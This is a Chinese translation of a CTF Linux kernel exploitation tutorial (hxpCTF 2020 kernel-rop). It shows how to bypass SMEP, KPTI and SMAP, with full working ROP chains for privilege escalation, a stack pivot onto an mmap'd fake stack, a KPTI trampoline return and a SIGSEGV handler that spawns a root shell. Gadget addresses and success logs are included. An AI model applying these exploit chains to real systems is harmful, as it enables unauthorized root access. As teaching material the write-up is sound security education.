> 原文链接: https://www.anquanke.com//post/id/244966 


# Ctf kernel pwn 入门——part2


                                阅读量   
                                **255209**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者lkmidas，文章来源：lkmidas.github.io
                                <br>原文地址：[https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/#adding-kpti﻿](https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/#adding-kpti%EF%BB%BF)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p4.ssl.qhimg.com/t012545340a2e59b738.png)](https://p4.ssl.qhimg.com/t012545340a2e59b738.png)



## Preface

欢迎来到Kernel Pwn第二部分，在第一章主要介绍了ret2usr(原题是hxpCTF 2020 challenge kernel-rop)。在这一章我将逐步开启smep, kpti, smap并且展示相应的绕过方法。

****注意****：本人主要进行了翻译，并在自己有疑惑的地方查了一些资料，专业知识以及英语水平有点抠脚还请大佬们见谅



## Adding SMEP

### <a class="reference-link" name="Introduction"></a>Introduction

`smep`可以看做用户区保护的`NX`，在kernel中由CR4寄存器的第20位设置是否开启。我们在启动参数`-cpu`后面加上`+smep`开启。

回想我们第一部分的提权方法，是通过执行在用户区的函数完成。但现在由于smep开启在内核模式我们将无法执行用户区代码，类似与用户程序开启了NX保护我们可以通过**Return-oriented programming (ROP)**来绕过这样的保护也就是`kernel ROP`

对此我假设由一下两种rop情况：
- 我们能够对内核栈任意读写，也就是我们上一章处理的
- 我们仅仅能覆盖内核栈的返回地址
那就先来看看第一种情况

### <a class="reference-link" name="The%20attempt%20to%20overwrite%20CR4"></a>The attempt to overwrite CR4

记得我说过smep是由CR4寄存器来决定是否开启的，那么既然我们处于内核模式就有这个能力修改这个寄存器比如找到这样的gadget：`mov cr4, rdi`。这个指令来自函数：native_write_cr4()，他用他的参数会修改CR4寄存器，是一个**内核函数**。所以我第一个绕过思路就是利用rop构造一个这样的函数：`native_write_cr4(value)`，这个value就是用来置零CR4的第20位。

就像我们执行提权函数commit_creds()和prepare_kernel_cred()，我们可以在/proc/kallsyms中找到(记得先开启root):

```
/ # cat /proc/kallsyms | grep native_write_cr4
ffffffff814443e0 T native_write_cr4
```

我们在内核中构造rop链其实就像我们在用户程序做的一样。所以我们先利用rop链执行**native_write_cr4(value)**然后再返回到我们的用户区提权函数。我们还得先泄露CR4寄存器的值，来构造value，这一点可以通过制造内核错误来获取，比如此时开启了smep我们上一个exp执行就会出错：

```
[  254.447914] unable to execute userspace code (SMEP?) (uid: 0)
[  254.451109] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  254.451238] CR2: 0000000000400ba4 CR3: 0000000006544000 CR4: 00000000001006f0
```

我们将清除第20位也就是0x100000，所以我们的value就是`0x6f0`.代码如下：

```
unsigned long pop_rdi_ret = 0xffffffff81006370;
unsigned long native_write_cr4 = 0xffffffff814443e0;
void overflow_nx(void)`{`
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0x0;    //rbx
    payload[off++] = 0x0;    //r12
    payload[off++] = 0x0;    //rbp
    payload[off++] = pop_rdi_ret;    //ret
    payload[off++] = 0x6f0;
    payload[off++] = native_write_cr4;         //native_write_cr4(0x6f0)
    payload[off++] = (unsigned long)escalate_privs;

    puts("[*] Prepared payload");
    ssize_t w = write(global_fd, payload, sizeof(payload));

    puts("[!] Should Never be reached");    
`}`
```

对于gadget：`pop rdi ; ret`通过我们早就生成的**gadgets.txt**可以轻易找到，但是由于我们是寻找所有的gadgets可能有些处于**不可执行段**，所以有时候要多试试其他的。

那么理论上来说我们就可以获取root shell了，但是现实是残酷的，kernel任然会crash让我们更为疑惑的是crash的原因竟然是`smep`：

```
[    6.198588] unable to execute userspace code (SMEP?) (uid: 1000)
[    6.204110] CR2: 0000000000400ba4 CR3: 0000000006518000 CR4: 00000000001006f0
```

似乎我们的rop并没有起作用，CR4寄存器的第20位没有置零。为此我去google上查找native_write_cr4()的源码和一些资料来解释这种情况：

```
void native_write_cr4(unsigned long val)
`{`
    unsigned long bits_changed = 0;

set_register:
    asm volatile("mov %0,%%cr4": "+r" (val) : : "memory");

    if (static_branch_likely(&amp;cr_pinning)) `{`
        if (unlikely((val &amp; cr4_pinned_mask) != cr4_pinned_bits)) `{`
            bits_changed = (val &amp; cr4_pinned_mask) ^ cr4_pinned_bits;
            val = (val &amp; ~cr4_pinned_mask) | cr4_pinned_bits;
            goto set_register;
        `}`
        /* Warn after we've corrected the changed bits. */
        WARN_ONCE(bits_changed, "pinned CR4 bits changed: 0x%lx!?\n",
              bits_changed);
    `}`
`}`
```

还有这里的一个&lt;a href=”https://patchwork.kernel.org/project/kernel-hardening/patch/20190220180934.GA46255[@beast](https://github.com/beast)/”&gt;文档说明了CR4固定的情况。文档表示在新版本的内核中，CR4寄存器的第20和21位在启动时就固定了不光如此，每次这两位被修改时又会立即重新被设置，也就是说他们`不可能被覆盖`

那么我第一个思路失败了，但至少我们知道在内核态是有权限去修改CR4寄存器的，内核开发者已经意识到我们的这种攻击并且使用相关设置来防御。所以来看看另一更为强大的方案。

### <a class="reference-link" name="Building%20a%20complete%20escalation%20ROP%20chain"></a>Building a complete escalation ROP chain

在第二个方案中，我们已经完全放弃了通过用户区代码进行提权的想法了，而是仅仅通过ROP链来达到提权目的，我们的计划直截了当：
1. ROP执行prepare_kernel_cred(0)
1. ROP执行commit_creds()，参数为上一步的结果
1. ROP执行swapgs; ret
<li>ROP执行iretq并且将栈设置为：**RIP|CS|RFLAGS|SP|SS**
</li>
这个ROP链本身不是很复杂，但难点在于如何用如此多的gadgets来构造他们。就像我之前提到过ROPgadget找到的所有gadgets有很大一部分是不可执行的。因此我必须通过数次的试错来找到正确可用的gadgets，来将第一步的返回值放入rdi传给第二步的commit_creds()。

```
//自己的方案
unsignde long push_rax_pop_rdi_ret = 0xffffffff81e5f09c;
...
payload[off++] = cookie;
payload[off++] = 0x0;    //rbx
payload[off++] = 0x0;    //r12
payload[off++] = 0x0;    //rbp
payload[off++] = pop_rdi_ret;
payload[off++] = 0;
payload[off++] = prepare_kernel_cred;
payload[off++] = push_rax_pop_rdi_ret;
payload[off++] = commit_creds;
...
//原文作者
unsigned long pop_rdx_ret = 0xffffffff81007616; // pop rdx ; ret
unsigned long cmp_rdx_jne_pop2_ret = 0xffffffff81964cc4; // cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret
unsigned long mov_rdi_rax_jne_pop2_ret = 0xffffffff8166fea3; // mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret

...
payload[off++] = pop_rdx_ret;
payload[off++] = 0x8; // rdx &lt;- 8
payload[off++] = cmp_rdx_jne_pop2_ret; // make sure JNE doesn't branch
payload[off++] = 0x0; // dummy rbx
payload[off++] = 0x0; // dummy rbp
payload[off++] = mov_rdi_rax_jne_pop2_ret; // rdi &lt;- rax
payload[off++] = 0x0; // dummy rbx
payload[off++] = 0x0; // dummy rbp
payload[off++] = commit_creds; // commit_creds(prepare_kernel_cred(0))
...
```

接下里寻找swapgs和iretq：

```
cat ./gadgets.txt | grep "swapgs"
0xffffffff8100a55f : swapgs ; pop rbp ; ret

➜  Kernel git:(main) ✗ objdump -j .text -d ./vmlinux | grep iretq | head -1
ffffffff8100c0d9:    48 cf                    iretq
```

iretq指令用ROPgadgets没找到。整个ROP链如下：

```
unsigned long push_rax_pop_rdi_ret = 0xffffffff81e5f09c;
unsigned long prepare_kernel_cred = 0xffffffff814c67f0;
unsigned long commit_creds = 0xffffffff814c6410;
unsigned long swapgs_pop_rbp_ret = 0xffffffff8100a55f;
unsigned long iretq = 0xffffffff8100c0d9;
void overflow_nx2(void)`{`
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0x0;    //rbx
    payload[off++] = 0x0;    //r12
    payload[off++] = 0x0;    //rbp
    payload[off++] = pop_rdi_ret;
    payload[off++] = 0;
    payload[off++] = prepare_kernel_cred;
    payload[off++] = push_rax_pop_rdi_ret;
    payload[off++] = commit_creds;
    payload[off++] = swapgs_pop_rbp_ret;
    payload[off++] = 0xdeadbeef;
    payload[off++] = iretq;
    payload[off++] = user_rip;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    puts("[*] Prepared payload");
    ssize_t w = write(global_fd, payload, sizeof(payload));

    puts("[!] Should never be reached");
`}`
```

试了一下果不其然出错了：

```
[    5.005786] kernel tried to execute NX-protected page - exploit attempt? (uid: 1000)
[    5.006041] BUG: unable to handle page fault for address: ffffffff81e5f09c
```

原因就是我找的那个gadgets：**push_rax_pop_rdi_ret**不是代码段，确实有点难找。就直接用原作者的：

```
unsigned long pop_rdx_ret = 0xffffffff81007616; // pop rdx ; ret
unsigned long cmp_rdx_jne_pop2_ret = 0xffffffff81964cc4; // cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret
unsigned long mov_rdi_rax_jne_pop2_ret = 0xffffffff8166fea3; // mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret
unsigned long commit_creds = 0xffffffff814c6410;
unsigned long prepare_kernel_cred = 0xffffffff814c67f0;
unsigned long swapgs_pop1_ret = 0xffffffff8100a55f; // swapgs ; pop rbp ; ret
unsigned long iretq = 0xffffffff8100c0d9;

void overflow_nx2(void)`{`
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = pop_rdi_ret; // return address
    payload[off++] = 0x0; // rdi &lt;- 0
    payload[off++] = prepare_kernel_cred; // prepare_kernel_cred(0)
    payload[off++] = pop_rdx_ret;
    payload[off++] = 0x8; // rdx &lt;- 8
    payload[off++] = cmp_rdx_jne_pop2_ret; // make sure JNE doesn't branch
    payload[off++] = 0x0; // dummy rbx
    payload[off++] = 0x0; // dummy rbp
    payload[off++] = mov_rdi_rax_jne_pop2_ret; // rdi &lt;- rax
    payload[off++] = 0x0; // dummy rbx
    payload[off++] = 0x0; // dummy rbp
    payload[off++] = commit_creds; // commit_creds(prepare_kernel_cred(0))
    payload[off++] = swapgs_pop1_ret; // swapgs
    payload[off++] = 0x0; // dummy rbp
    payload[off++] = iretq; // iretq frame
    payload[off++] = user_rip;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    puts("[*] Prepared payload");
    ssize_t w = write(global_fd, payload, sizeof(payload));

    puts("[!] Should never be reached");
`}`
```

成功提权：

```
/ $ ./exploit 
[*] Saved state
[*] Opened device
a
[*] Leaked 160 bytes
[*] Cookie: 93a28166c6db3100
[*] Prepared payload
[*] Return to userland
[*] UID: 0, got root!
/ #
```

在第一种情况(任意读写栈)，我们成功绕过了smep并获取root shell，接下来看看第二种情况。

### <a class="reference-link" name="Pivoting%20the%20stack"></a>Pivoting the stack

很明显第二种情况我们无法在ret地址后面部署更多的gadgets，所以我们使用在用户程序经常使用的`栈迁移`。这就需要修改rsp/esp的gadgets，这对我们巨量的gadgets一般不成问题，只需保证gadgets可执行，并且那个给rsp/esp赋值的常量是地址对齐的：

```
unsigned long mov_esp_pop2_ret = 0xffffffff8196f56a; // mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret
```

那么在我们用这个gadget覆盖返回地址前，我们得建立那个地址上的fake_stack。因为esp将会变为**0x5b000000**，所以使用mmap一块内存在那里，并填充ROP链：

```
unsigned long *fake_stack;
void build_fake_stack(void)`{`
    puts("[*] Build fake stack start");
    fake_stack = mmap((void *)(0x5b000000 - 0x1000), 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);
    unsigned off = 0x1000/8;
    fake_stack[0] = 0xdeadbeef;
    fake_stack[off++] = 0x0;     //pop r12
    fake_stack[off++] = 0x0;    //pop rbp
    fake_stack[off++] = pop_rdi_ret;    //ret
    fake_stack[off++] = 0x0; // rdi &lt;- 0
    fake_stack[off++] = prepare_kernel_cred; // prepare_kernel_cred(0)
    fake_stack[off++] = pop_rdx_ret;
    fake_stack[off++] = 0x8; // rdx &lt;- 8
    fake_stack[off++] = cmp_rdx_jne_pop2_ret; // make sure JNE doesn't branch
    fake_stack[off++] = 0x0; // dummy rbx
    fake_stack[off++] = 0x0; // dummy rbp
    fake_stack[off++] = mov_rdi_rax_jne_pop2_ret; // rdi &lt;- rax
    fake_stack[off++] = 0x0; // dummy rbx
    fake_stack[off++] = 0x0; // dummy rbp
    fake_stack[off++] = commit_creds; // commit_creds(prepare_kernel_cred(0))
    fake_stack[off++] = swapgs_pop1_ret; // swapgs
    fake_stack[off++] = 0x0; // dummy rbp
    fake_stack[off++] = iretq; // iretq frame
    fake_stack[off++] = user_rip;
    fake_stack[off++] = user_cs;
    fake_stack[off++] = user_rflags;
    fake_stack[off++] = user_sp;
    fake_stack[off++] = user_ss;
`}`
```

这里从**0x5b000000-0x1000**开始获取0x2000(两页)的空间(rwx)：0x5afff000 ~ 0x5b001000，这时为了防止ROP链在调用提权函数时`栈增长`，然后还需提前向**0x5b000000~0x5afff000**写入数据引发缺页写入页表，自己测试一下：

```
#注释fake_stack[0] = 0xdeadbeef;前
gdb-peda$ x/8gx 0x5b000000
0x5b000000:    0x0000000000000000    0x0000000000000000
0x5b000010:    0xffffffff81006370    0x0000000000000000
0x5b000020:    0xffffffff814c67f0    0xffffffff81007616
0x5b000030:    0x0000000000000008    0xffffffff81964cc4
gdb-peda$ x/8gx 0x5afff000
0x5afff000:    0x00000000deadbeef    0x0000000000000000
0x5afff010:    0x0000000000000000    0x0000000000000000
0x5afff020:    0x0000000000000000    0x0000000000000000
0x5afff030:    0x0000000000000000    0x0000000000000000
#注释后
gdb-peda$ x/8gi 0x5b000000
   0x5b000000:    add    BYTE PTR [rax],al
   0x5b000002:    add    BYTE PTR [rax],al
   0x5b000004:    add    BYTE PTR [rax],al
   0x5b000006:    add    BYTE PTR [rax],al
   0x5b000008:    add    BYTE PTR [rax],al
   0x5b00000a:    add    BYTE PTR [rax],al
   0x5b00000c:    add    BYTE PTR [rax],al
   0x5b00000e:    add    BYTE PTR [rax],al
gdb-peda$ x/8gi 0x5b000000-0x10
   0x5afffff0:    Cannot access memory at address 0x5afffff0        &lt;=====
gdb-peda$ x/8gi 0x5b000000-0x1000
   0x5afff000:    Cannot access memory at address 0x5afff000
```

因此我估计是要在进入内核前触发缺页才这样写(求大佬详解)。

在overflow之前设置号fake_stack+rop链然后溢出修改ret地址为`mov_esp_pop2_ret`进行栈迁移



## Adding KPTI

### <a class="reference-link" name="Introduction"></a>Introduction

KPTI全称为**Kernel page-table isolation** 页表隔离

如果还是用绕过smep的exp我们来看看：

```
/ $ ./exploit 
[*] Saved state
[*] Opened device

[*] Leaked 160 bytes
[*] Cookie: c634cddd98796600
[*] Build fake stack start
[*] Prepared payload
Segmentation fault
/ $
```

发生的是段错误，而不是内核的panic。以AI32架构的虚拟地址为例，0~3G是用户地址，由task_struct.mm_struct.pgd (page global directory, 页目录)管理。3~4G由内核全局目录init_mm.pgd管理有且仅有一份，每个进程都有一个task_struct对应一个pgd映射不同的物理内存实现程序间地址相互独立，而内核页表是所有程序共享的也就是说他们自己的**页表中有一份是copy内核的(可以映射整个内核)**。

因此为了防止内核数据泄露等漏洞，使用KPTI将两种分离：

[![](https://p2.ssl.qhimg.com/t0160ec2ec60072a753.png)](https://p2.ssl.qhimg.com/t0160ec2ec60072a753.png)

> 并非所有的内核页表条目在用户态页表内有克隆，仅仅是处理系统调用、中断、中断描述符、trace等最必要的一部分内核地址空间页表在用户态页表有克隆

当开启KPTI后，使用CR3寄存器来实现两态页表目录(地址空间)切换，**CR3的 bit47-bit11为 PGD的物理地址，最低为 bit12用于进行 PGD切换；bit12=0为内核态PGD，bit12=1为用户态 PGD。**

[![](https://p5.ssl.qhimg.com/t01a70d551fc043bc08.png)](https://p5.ssl.qhimg.com/t01a70d551fc043bc08.png)

### <a class="reference-link" name="KPTI%20trampoline"></a>KPTI trampoline

既然进入要分离页表，如果不调整CR3就直接返回系统调用那么使用的页表还是内核态而在smep的加持下用户区的代码是不可执行的，所以必然内核存在用于这种情况的返回函数：

```
/ # cat /proc/kallsyms  | grep swapgs_restore_regs_and_return_to_usermode
ffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode
gdb-peda$ x/32gi 0xffffffff81200f10
   0xffffffff81200f10 &lt;_stext+2101008&gt;:    pop    r15
   0xffffffff81200f12 &lt;_stext+2101010&gt;:    pop    r14
   0xffffffff81200f14 &lt;_stext+2101012&gt;:    pop    r13
   0xffffffff81200f16 &lt;_stext+2101014&gt;:    pop    r12
   0xffffffff81200f18 &lt;_stext+2101016&gt;:    pop    rbp
   0xffffffff81200f19 &lt;_stext+2101017&gt;:    pop    rbx
   0xffffffff81200f1a &lt;_stext+2101018&gt;:    pop    r11
   0xffffffff81200f1c &lt;_stext+2101020&gt;:    pop    r10
   0xffffffff81200f1e &lt;_stext+2101022&gt;:    pop    r9
   0xffffffff81200f20 &lt;_stext+2101024&gt;:    pop    r8
   0xffffffff81200f22 &lt;_stext+2101026&gt;:    pop    rax
   0xffffffff81200f23 &lt;_stext+2101027&gt;:    pop    rcx
   0xffffffff81200f24 &lt;_stext+2101028&gt;:    pop    rdx
   0xffffffff81200f25 &lt;_stext+2101029&gt;:    pop    rsi
   0xffffffff81200f26 &lt;_stext+2101030&gt;:    mov    rdi,rsp
   0xffffffff81200f29 &lt;_stext+2101033&gt;:    mov    rsp,QWORD PTR gs:0x6004
   0xffffffff81200f32 &lt;_stext+2101042&gt;:    push   QWORD PTR [rdi+0x30]        #ss
   0xffffffff81200f35 &lt;_stext+2101045&gt;:    push   QWORD PTR [rdi+0x28]        #sp
   0xffffffff81200f38 &lt;_stext+2101048&gt;:    push   QWORD PTR [rdi+0x20]        #rflags
   0xffffffff81200f3b &lt;_stext+2101051&gt;:    push   QWORD PTR [rdi+0x18]        #cs
   0xffffffff81200f3e &lt;_stext+2101054&gt;:    push   QWORD PTR [rdi+0x10]        #ip
   0xffffffff81200f41 &lt;_stext+2101057&gt;:    push   QWORD PTR [rdi]            #dummy rdi
   0xffffffff81200f43 &lt;_stext+2101059&gt;:    push   rax                        #dummy rax
   0xffffffff81200f44 &lt;_stext+2101060&gt;:    xchg   ax,ax
   0xffffffff81200f46 &lt;_stext+2101062&gt;:    mov    rdi,cr3                #&lt;=====
   0xffffffff81200f49 &lt;_stext+2101065&gt;:    jmp    0xffffffff81200f7f 

gdb-peda$ x/8gi 0xffffffff81200f7f
   0xffffffff81200f7f &lt;_stext+2101119&gt;:    or     rdi,0x1000
   0xffffffff81200f86 &lt;_stext+2101126&gt;:    mov    cr3,rdi                #&lt;=====
   0xffffffff81200f89 &lt;_stext+2101129&gt;:    pop    rax
   0xffffffff81200f8a &lt;_stext+2101130&gt;:    pop    rdi
   0xffffffff81200f8b &lt;_stext+2101131&gt;:    swapgs                         #&lt;=====
   0xffffffff81200f8e &lt;_stext+2101134&gt;:    nop    DWORD PTR [rax]
   0xffffffff81200f91 &lt;_stext+2101137&gt;:    jmp    0xffffffff81200fc0 &lt;_stext+2101184&gt;
   0xffffffff81200f96 &lt;_stext+2101142&gt;:    nop

gdb-peda$ x/8gi 0xffffffff81200fc0
   0xffffffff81200fc0 &lt;_stext+2101184&gt;:    test   BYTE PTR [rsp+0x20],0x4
   0xffffffff81200fc5 &lt;_stext+2101189&gt;:    jne    0xffffffff81200fc9 &lt;_stext+2101193&gt;
   0xffffffff81200fc7 &lt;_stext+2101191&gt;:    iretq                          #&lt;=====
```

从第一个mov指令开始，会将原栈指针保存然后获取另一个内核栈并将**|ip|cs|rflags|sp|ss|(原来栈上的环境)**依次入栈，主要进行swapgs和cr3切换最后iretq返回用户态，期间有多余的两次pop需要注意

**<a class="reference-link" name="Exp"></a>Exp**

```
unsigned long kpti_trampoline = 0xffffffff81200f10 + 22;
void overflow_nx4(void)`{`
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0x0;    //rbx
    payload[off++] = 0x0;    //r12
    payload[off++] = 0x0;    //rbp
    payload[off++] = pop_rdi_ret;    //ret
    payload[off++] = 0;
    payload[off++] = prepare_kernel_cred;    
    payload[off++] = pop_rdx_ret;
    payload[off++] = 8;
    payload[off++] = cmp_rdx_jne_pop2_ret;
    payload[off++] = 0x0; // dummy rbx
    payload[off++] = 0x0; // dummy rbp
    payload[off++] = mov_rdi_rax_jne_pop2_ret; // rdi &lt;- rax
    payload[off++] = 0x0; // dummy rbx
    payload[off++] = 0x0; // dummy rbp
    payload[off++] = commit_creds; 
    payload[off++] = kpti_trampoline;
    payload[off++] = 0x0;        //dummy rax
    payload[off++] = 0x0;        //dummy rdi
    payload[off++] = user_rip;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    puts("[*] Payload done!");
    ssize_t w = write(global_fd, payload, sizeof(payload));

    puts("[*] Should nerver be reached");
`}`
/*
/ $ ./exploit 
[*] Saved state
[*] Opened device

[*] Leaked 160 bytes
[*] Cookie: a9deb7e729571200
[*] Payload done!
[*] Return to userland
[*] UID: 0, got root!
/ # 
*/
```

> 上面用于KPTI的payload模式可以用于也可以用于绕过smep，并且一般smep和KPTI都会一起出现再加上该payload的精简，所以这个payload是更为推荐使用的

### <a class="reference-link" name="Signal%20Handler"></a>Signal Handler

这种方法就比较巧妙了，利用signal handler处理原exp从内核态返回时发生的**segment fault**。我的理解是提前在程序中注册对`SIGSEGV`的处理函数，那么在原exp返回时遇到该错误将会由**内核控制程序状态的切换**并最终`正常的(内核自己完成CR3切换)`返回到消息处理函数，也就不需要我们用rop去完成了。因为cred结构体早就改好了(译者的粗略理解原文作者没作解释，如果有大佬知道还请详解)

**<a class="reference-link" name="Exp"></a>Exp**

```
void signal_shell(int signum)`{`
    printf("signal %d catched successfully!\n", signum);
    puts("[*] Return to userland");
    if(getuid() == 0)`{`
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    `}`
    else`{`
        printf("[!] UID: %d, do not get root\n",getuid());
        exit(-1);
    `}`
`}`
int main()
`{`
    save_state();
    open_dev();
    leak();
    build_fake_stack();
    signal(SIGSEGV, signal_shell);
    overflow_nx3();
    puts("[!] Should never be reached");
    printf("Hello Kernel");
    return 0;
`}`
/*
/ $ ./exploit 
[*] Saved state
[*] Opened device

[*] Leaked 160 bytes
[*] Cookie: 170a0b1ebc645300
[*] Build fake stack start
[*] Prepared payload
signal 11 catched successfully!
[*] Return to userland
[*] UID: 0, got root!
/ # ls
*/
```



## Adding SMAP

smap(Supervisor Mode Access Prevention)，内核态无法使用(读或写)用户区的数据，也就是smep的加强版。通过CR4寄存器的第21位设置。

当该防护开启时，对于上文(SMEP)提到的第一种情况，也就是溢出的数据足够把所有rop链放入内核栈时可以直接使用其对应的Exp，因为没有涉及对用户区数据。

### <a class="reference-link" name="Exp"></a>Exp

将`KASLR`之外所有保护打开，使用KPTI的第一个方案：

```
/ $ ./exploit #solution1
[*] Saved state
[*] Opened device

[*] Leaked 160 bytes
[*] Cookie: 6f2d6f787cb6e000
[*] Build fake stack start
[*] Payload done!
[*] Return to userland
[*] UID: 0, got root!
/ # exit
```

第二个signal hanlder同样涉及到用户区的代码(消息处理函数)

那么如果内核栈需要进行栈迁移这种情况，按前面的结局方案是先在用户区**mmap一块xwr内存**，里面放入我们的rop链，最终还是需要将内核栈返回地址覆盖为用户区的mmap出来的内存的地址，所以这种方案不可能轻易解决。

我们需要构建一个更为强大的Exp来处理这种棘手的情况，**那将会涉及到页表和页目录的知识**甚至更加深入的东西。如果有幸我能在CTF或者实际情况中遇到这种情况到时候再回来填坑，如果现在强行解释，这个系列就不应该叫入门教程了:)



## Conclusion

小结一下吧：在这一章我主要介绍了对于`SMEP`，`KPTI`，`SMAP`这些保护的基本绕过操作，以及参入两种溢出情况(是否需要栈迁移)。所有的绕过思路都围绕于`ROP`技术。

下一章我将回来解决这个原来的题目，也就是开启了`KASLR`的情况



## Reference
<li>KPTI详解：[https://www.anquanke.com/post/id/240006，](https://www.anquanke.com/post/id/240006%EF%BC%8C) [https://blog.csdn.net/juS3Ve/article/details/79544927，https://github.com/freelancer-leon/notes/blob/master/kernel/issues/kpti/kpti.md#%E5%86%85%E6%A0%B8%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4%E7%9A%84%E9%A1%B5%E8%A1%A8%E6%98%A0%E5%B0%84](https://blog.csdn.net/juS3Ve/article/details/79544927%EF%BC%8Chttps://github.com/freelancer-leon/notes/blob/master/kernel/issues/kpti/kpti.md#%E5%86%85%E6%A0%B8%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4%E7%9A%84%E9%A1%B5%E8%A1%A8%E6%98%A0%E5%B0%84)
</li>
<li>原文：[https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/#adding-kpti](https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/#adding-kpti)
</li>
- 附件：直接看原文末尾由原文作者的所有附件，如果需要我的附件，可以说一下